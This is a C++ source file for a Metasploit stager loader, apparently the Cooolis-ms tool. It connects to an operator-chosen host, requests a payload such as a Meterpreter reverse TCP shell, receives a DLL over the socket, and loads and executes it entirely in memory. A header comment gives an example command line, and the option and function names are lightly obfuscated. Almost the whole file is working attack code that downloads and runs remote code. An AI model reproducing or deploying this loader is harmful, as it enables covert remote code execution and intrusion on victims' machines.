/**************************
Code By Rvn0xsy
https://payloads.online
Email:rvn0xsy@gmail.com
Commandline e.g.>Cooolis-ms-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.164.136,LPORT=8866 -H 192.168.164.136 -P 8899
***************************/

#include <WinSock2.h>
#include <iostream>
#include <Windows.h>
#include <winbase.h>
#include <tchar.h>
#include <Ws2tcpip.h>
#include "MemoryModule.h"
#include "CLI11.hpp"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib , "Advapi32.lib")

using namespace std;
CONST INT PAYLOAD_LEN = 200;
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

#pragma pack(4)
struct stager {
	char payload[PAYLOAD_LEN];
	char options[PAYLOAD_LEN];
};
#pragma pack()


int main(int argc, char** argv)
{
	CHAR cFunctionName[] = { 'D','l','l','M','a','n','\0' };
	CLI::App app{ "Version v1.1.2" };
	DWORD msf_server_port = 8899;
	std::string msf_payload = "";
	std::string msf_options = "";
	std::string msf_server_host = "";
	app.add_option("-p,--ppp", msf_payload, "ppp")->required();
	app.add_option("-o,--ooo", msf_options, "ooo")->required();
	app.add_option("-P,--PORT", msf_server_port, "Port")->check(CLI::Range(1, 65535))->required();
	app.add_option("-H,--HOST", msf_server_host, "Host")->check(CLI::ValidIPV4)->required();

	try {
		app.parse(argc, argv);
		if (msf_options.length() > 200 || msf_payload.length() > 200) {
			std::cout << "PType And POptions Too long!" << std::endl;
		}
	}
	catch (const CLI::ParseError& e) {
		std::cout << app.help() << std::endl;
		// std::cout << e.get_exit_code() << std::endl;
		return app.exit(e);
	}

	// ��ʼ��winsock
	HANDLE hThread = NULL; // �߳̾��
	SOCKET socks; // �׽���
	stager sd;		// �������ݽṹ��
	DWORD dwPayloadLength = 0; // shellcode ��С
	struct sockaddr_in sock_addr; // �׽�������
	DWORD dwThread;
	HMEMORYMODULE hModule;
	Module DllMain;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	DWORD dwSdSizeof = sizeof(sd);
	// ��ʼ��
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		cout << "[!] WSAStartup Error " << GetLastError() << endl;
		return 0;
	}

	
	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // �����׽���
	ZeroMemory(sd.payload, PAYLOAD_LEN); // ����ڴ�
	ZeroMemory(sd.options, PAYLOAD_LEN); // ����ڴ�
	CopyMemory(sd.options, msf_options.c_str(), msf_options.length());
	CopyMemory(sd.payload, msf_payload.c_str(), msf_payload.length());



	InetPtonA(AF_INET, msf_server_host.c_str(), &(sock_addr.sin_addr)); // ת��IP��ַ
	sock_addr.sin_family = AF_INET;		// �׽�������
	sock_addr.sin_port = htons(msf_server_port);  // �׽��ֶ˿�
	// �����׽���
	while (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
		cout << "[!] Connect error ! " << GetLastError() << endl;
		Sleep(5000);
		continue;
	}

	// �����ֽ���
	send(socks, (char*)& sd, sizeof(sd), 0);

	// ����Shellcode����
	recv(socks, (char*)& dwPayloadLength, sizeof(DWORD), 0);

	// �ȴ�����ִ��
	Sleep(3000);




	// �����ڴ�ҳ
	CHAR* pSpace = (CHAR*)VirtualAlloc(NULL, dwPayloadLength, MEM_COMMIT, PAGE_READWRITE);

	// ��Shellcode�����ڴ�ҳ
	recv(socks, pSpace, dwPayloadLength,0);

	// �ر��׽���
	closesocket(socks);

	// ����PE�ļ�
	hModule = MemoryLoadLibrary(pSpace);
	// hModule = MemoryLoadLibrary(NULL);
	DllMain = (Module)MemoryGetProcAddress(hModule, cFunctionName);
	
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);


	return GetLastError();
}

